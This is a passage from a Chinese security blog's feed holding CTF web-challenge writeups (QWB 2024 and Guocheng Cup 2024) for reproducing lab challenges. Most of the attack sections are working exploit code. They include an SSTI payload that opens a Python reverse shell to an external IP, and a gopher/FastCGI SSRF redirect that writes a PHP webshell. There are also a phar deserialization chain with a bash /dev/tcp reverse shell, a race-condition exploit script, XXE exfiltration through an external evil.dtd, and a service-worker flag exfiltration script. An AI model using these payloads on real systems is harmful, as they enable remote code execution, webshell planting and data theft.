class="line"><span class="string">const html = `</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;input id=&quot;expr&quot; type=&quot;text&quot; value=&quot;&quot;&gt;&lt;button id=&quot;calc&quot;&gt;Calculate&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">calc.onclick = () =&gt; &#123; window.location.href = &quot;%s/?flag=&quot;+encodeURIComponent(expr.value) &#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;fetch&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  if (event.request.url.endsWith(&#x27;/&#x27;)) &#123;</span></span><br><span class="line"><span class="string">    event.respondWith(</span></span><br><span class="line"><span class="string">      new Response(html, &#123;</span></span><br><span class="line"><span class="string">        headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;</span></span><br><span class="line"><span class="string">      &#125;)</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;%s&#x27;</span>, RECEIVER).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_payload</span>(<span class="params">expr_payload</span>):</span><br><span class="line">    url = TARGET + <span class="string">&#x27;/api/report&#x27;</span></span><br><span class="line">    json = &#123;<span class="string">&quot;expression&quot;</span>: expr_payload, <span class="string">&quot;result&quot;</span>: <span class="string">&quot;[]&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;comment&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;screenshots&quot;</span>: []&#125;</span><br><span class="line">    r = requests.post(url, json=json)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    json = upload_file(service_worker_html)</span><br><span class="line">    fp = <span class="string">&#x27;/&#x27;</span> + json[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;path&#x27;</span>].replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Service Worker: <span class="subst">&#123;fp&#125;</span>&quot;</span>)</span><br><span class="line">    payload = gen_payload(<span class="string">f&#x27;&#x27;&#x27;navigator.serviceWorker.register(`<span class="subst">&#123;fp&#125;</span>`)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    json = post_payload(payload)</span><br><span class="line">    report_id = json[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Report ID: <span class="subst">&#123;report_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;URL: <span class="subst">&#123;TARGET&#125;</span>/api/report/<span class="subst">&#123;report_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>成功外带flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/b05a415a7edf54e74e298c5f4f6d8dec.png"></p><h2 id="Playground-TODO"><a href="#Playground-TODO" class="headerlink" title="Playground TODO"></a>Playground TODO</h2><h3 id="环境搭建-8"><a href="#环境搭建-8" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name playground -p 9000:5000 sketchpl4ne/qwb2024:playground_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目实现了运行go程序的sandbox，flask接收用户提交的go代码，go build为可执行文件后，发送到用C写的sandbox里。</p><p>看不清楚<code>sandbox.c</code>里面有什么漏洞，有会的师傅可以教教我 :-)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
    <category term="go" scheme="https://jaspersec.top/tags/go/"/>
    
    <category term="python" scheme="https://jaspersec.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>国城杯2024 线上赛 writeup</title>
    <link href="https://jaspersec.top/posts/4142772759.html"/>
    <id>https://jaspersec.top/posts/4142772759.html</id>
    <published>2024-12-16T01:47:00.000Z</published>
    <updated>2025-03-31T22:09:47.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#120;&#x6d;&#99;&#118;&#x65;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#120;&#x6d;&#99;&#118;&#x65;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;</a></li><li>联系QQ：1609410364</li></ul><p>国城杯的题不错的，复现了一下4个web，顺手做了docker方便师傅复现。</p><p>PS: 图片在Github图床，加载不出请更换网络。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f2a73f5c2f55595830f81e96190f6763.png"></p><h2 id="ez-gallery"><a href="#ez-gallery" class="headerlink" title="ez_gallery"></a>ez_gallery</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name ez_gallery -d -p 8080:6543 sketchpl4ne/gcb2024:ez_gallery_img</span><br></pre></td></tr></table></figure><h3 id="解题思路1"><a href="#解题思路1" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：ssti request外带出网反弹shell</strong></p><p>首先是任意文件读，读<code>app.py</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info?file=/app/app.py</span><br></pre></td></tr></table></figure><p>ssti绕waf实现rce，反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shell?shellcmd=&#123;&#123;config|attr(%22__class__%<span class="number">22</span>)|attr(%27__init__%<span class="number">27</span>)|attr(%27__globals__%<span class="number">27</span>)|attr(%27__getitem__%<span class="number">27</span>)(%27__builtins__%<span class="number">27</span>)|attr(%27__getitem__%<span class="number">27</span>)(%27<span class="built_in">eval</span>%<span class="number">27</span>)(request|attr(%27GET%<span class="number">27</span>)|attr(%27get%<span class="number">27</span>)(%27pzh%<span class="number">27</span>))&#125;&#125;&amp;pzh=<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).system(<span class="string">&#x27;python+-c+\&#x27;import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&quot;116.62.38.71&quot;,9999))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])%3b\&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fdd891af2dce0ce0a8385d71d5fb068a.png"></p><h3 id="解题思路2"><a href="#解题思路2" class="headerlink" title="解题思路2"></a>解题思路2</h3><p><strong>思路：其实一开始看到pyramid，就猜到是换个框架写内存马，得看doc，先鸽XD</strong></p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name signal -d -p 8082:80 sketchpl4ne/gcb2024:signal_img</span><br></pre></td></tr></table></figure><h3 id="解题思路1-1"><a href="#解题思路1-1" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：ssrf绕https限制，gopher打fastcgi</strong></p><p>首先vim恢复文件得到guest用户：<code>guest/MyF3iend</code></p><p>进去是个文件包含，<code>guest.php</code>有waf，用二次url编码绕过读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？path=php:<span class="comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=/tmp/hello.php</span></span><br></pre></td></tr></table></figure><p>找一找，可以读<code>StoredAccounts.php</code>，拿到admin用户：<code>admin/FetxRuFebAdm4nHace</code></p><p><code>admin.php</code>进去是ssrf，必须是https开头，这里用ngrok弄一个带https的域名，反代自己的vps，再用302跳转打本地的fastcgi。</p><p>去ngrok官网注册个好，设置好token，vps下面命令起服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngork http 8080</span><br></pre></td></tr></table></figure><p>vps再起一个python服务用来302跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">indexRedirect</span>():</span><br><span class="line">    redirectUrl = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH111%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00o%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20%40eval%28%5C%24_POST%5B1%5D%29%3B%20%3F%3E%22%20%3E/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(redirectUrl)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jasper&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>payload用gopherus生成， 注意指定文件名要存在，fastcgi的事儿，写webshell如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d4dc72337c68b3881daf83d9c1b3b48e.png"></p><p>然后设置好服务，打一发payload<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/99fa6f95e3cbb32388ff5bfc26dc0da1.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d7b055c1179fa444e42bc8440ab211f7.png"></p><p>接着蚁剑上线，只有假flag，suid提权发现有sudo，<code>sudo -l</code>看到cat的可读路径使用了通配符，通过目录穿越读flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c665a33c9689996cb6b8895b1b478027.png"></p><h3 id="解题思路2-1"><a href="#解题思路2-1" class="headerlink" title="解题思路2"></a>解题思路2</h3><p>用filterchain，非预期，可以看晨曦师傅的wp。</p><h2 id="noob-unser"><a href="#noob-unser" class="headerlink" title="noob_unser"></a>noob_unser</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name noob_unser -d -p 8083:80 sketchpl4ne/gcb2024:noob_unser_img</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路：upload_process上传临时文件+过滤器清洗数据+phar反序列化</strong></p><p>问了道格的师傅，这题是Orange师傅的两道题结合起来了，非常巧妙。</p><p>cookie显然可以反序列化，然后有两个功能：</p><ol><li>user用户可以复制文件（filename有waf）</li><li>admin用户可以rce</li></ol><p>php upload process可以在&#x2F;tmp下生成部分内容可控的<code>sess_&lt;sessionid&gt;</code>文件<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/465edd36a06a709f9089ed05c251af98.png"></p><p>然后copy是可以使用伪协议的，使用伪协议+copy将内容复制到<code>/tmp/tmp.tmp</code>中，同时把不可控的部分消除掉，这里用到php exit死亡绕过的知识点。</p><p>可控内容之前的<code>upload_process_</code>字段，添加<code>aaaaaa</code>后，三次base64即可置空<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/68da51ec0b0e361e9a3438afaaf6d3d4.png"></p><p>可控内容之后，用<code>string.strip_tags</code>过滤器可以全部清除掉，只需在可控部分之后加个<code>&lt;</code>即可</p><p>payload构造： <code>aaaaaa</code>+base64_encode(base64_encode(base64_encode(payload))) + <code>&lt;</code></p><p>payload触发：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/tmp/sess_jasper</span></span><br></pre></td></tr></table></figure><p>至此实现了&#x2F;tmp&#x2F;tmp.tmp任意写， 于是构造<code>exp.phar</code>文件，里面包含Admin类的序列化字符串，再使用phar伪协议触发反序列化，实现代码执行。</p><p>构造phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);                  <span class="comment">// 后缀名必须为 phar，生成之后可以修改</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">// 设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="string">&quot;system(&#x27; bash -c \&quot;bash -i &gt;&amp; /dev/tcp/*.*.*.*/9999 0&gt;&amp;1\&quot;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);                         <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;jasper&quot;</span>, <span class="string">&quot;123&quot;</span>);       <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">                                                    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pharContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;exp.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$b64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$pharContent</span>)));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;bbbbbb&quot;</span>.<span class="variable">$b64</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python脚本一键利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;jasper1&#x27;</span></span><br><span class="line"><span class="comment"># url = &#x27;http://127.0.0.1:8888/index.php&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://125.70.243.22:31293/index.php&quot;</span></span><br><span class="line"><span class="comment">## read flag</span></span><br><span class="line">phar_payload = <span class="string">&quot;bbbbbbVUVRNWQyRklRV2RZTVRsSlVWVjRWVmd3VGxCVVZrSktWRVZXVTB0RGF6ZEpSRGdyUkZGd2RFRkJRVUZCVVVGQlFVSkZRVUZCUVVKQlFVRkJRVUZCTlVGQlFVRlVlbTh4VDJsS1FscEhNWEJpYVVrMlRWUndOMk42YnpCUGFVcHFZakpTYkVscWRIcFBha2w1VDJsS2VtVllUakJhVnpCdlNuazVlVnBYUm10ak1sWnFZMjFXTUVwNWF6ZEphblE1UW1kQlFVRkhjR2hqTTBKc1kyZE5RVUZCUkU5d01WSnVRWGRCUVVGT1NtcFRTV2t5UVZGQlFVRkJRVUZCUkVWNVRTOWtkbll5V1hoSE5GaE9jRXBPTHpWWmFFWlBXRGx4ZUdFMGMwRm5RVUZCUldSRFZGVkpQUT09&lt;&quot;</span></span><br><span class="line"><span class="comment"># reverse shell</span></span><br><span class="line"><span class="comment"># phar_payload = &quot;bbbbbbVUVRNWQyRklRV2RZTVRsSlVWVjRWVmd3VGxCVVZrSktWRVZXVTB0RGF6ZEpSRGdyUkZGeFdFRkJRVUZCVVVGQlFVSkZRVUZCUVVKQlFVRkJRVUZDYWtGQlFVRlVlbTh4VDJsS1FscEhNWEJpYVVrMlRWUndOMk42YnpCUGFVcHFZakpTYkVscWRIcFBhbGt3VDJsS2VtVllUakJhVnpCdlNubENhVmxZVG05SlF6RnFTVU5LYVZsWVRtOUpRekZ3U1VRMGJVbERPV3RhV0ZsMlpFZE9kMHg2UlhoT2FUUXlUV2swZWs5RE5ETk5VemcxVDFSck5VbEVRU3RLYWtWcFNubHJOMGxxZERsQ1owRkJRVWR3YUdNelFteGpaMDFCUVVGRFVqRnNVbTVCZDBGQlFVNUthbE5KYVRKQlVVRkJRVUZCUVVGRVJYbE5lV2xOVG5GMGFFaElOMmhyT0Uxa1EwZFJjM2hGY1hORE1XZDBRV2RCUVVGRlpFTlVWVWs5&lt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局事件，用于协调线程退出</span></span><br><span class="line">stop_event = threading.Event()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_session_file</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: phar_payload&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_to_tmp</span>(<span class="params">session</span>):</span><br><span class="line">    payload = <span class="string">&quot;?filename=php://filter/string.strip_tags|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        res = requests.get(url + payload, cookies=session.cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Well done!&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 恶意phar已copy到/tmp/tmp.tmp ...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 拷贝失败！&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;D0g3xGC&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            stop_event.<span class="built_in">set</span>()  <span class="comment">## 设置退出事件</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser_phar</span>(<span class="params">session</span>):</span><br><span class="line">    payload = <span class="string">&quot;?filename=phar:///tmp/tmp.tmp/jasper&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        res = requests.get(url + payload, cookies=session.cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;D0g3xGC&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 利用成功！&quot;</span>)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()  <span class="comment">## 设置退出事件</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并启动线程</span></span><br><span class="line">write_thread = threading.Thread(target=write_session_file, args=(session,))</span><br><span class="line">write_thread.daemon = <span class="literal">True</span></span><br><span class="line">write_thread.start()</span><br><span class="line"></span><br><span class="line">copy_thread = threading.Thread(target=copy_to_tmp, args=(session,))</span><br><span class="line">copy_thread.daemon = <span class="literal">True</span></span><br><span class="line">copy_thread.start()</span><br><span class="line"></span><br><span class="line">unser_thread = threading.Thread(target=unser_phar, args=(session,))</span><br><span class="line">unser_thread.daemon = <span class="literal">True</span></span><br><span class="line">unser_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主线程保持活跃，等待子线程结束</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/92c3e03d438a822ac2fa4370005d0346.png"></p><h2 id="easy-jelly"><a href="#easy-jelly" class="headerlink" title="easy_jelly"></a>easy_jelly</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name easy_jelly -d -p 8081:80 sketchpl4ne/gcb2024:easy_jelly_img</span><br></pre></td></tr></table></figure><p>PS：物理机起环境的时候注意下，lib要删除<code>servlet-api-2.3.jar</code>，依赖有冲突。</p><h3 id="解题思路1-2"><a href="#解题思路1-2" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：非预期，xxe 盲打，有老六</strong><br>exp1.xml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;!DOCTYPE</span> <span class="string">test</span> [</span><br><span class="line"><span class="string">&lt;!ENTITY</span> <span class="string">%</span> <span class="string">file</span> <span class="string">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span><span class="string">&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY</span> <span class="string">%</span> <span class="string">dtd</span> <span class="string">SYSTEM</span> <span class="string">&quot;http://116.62.38.71:7777/evil.dtd&quot;</span><span class="string">&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line">]<span class="string">&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://116.62.38.71:7777/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/68a37e27e4a3b7fc460d932523986c35.png"></p><h3 id="解题思路2-2"><a href="#解题思路2-2" class="headerlink" 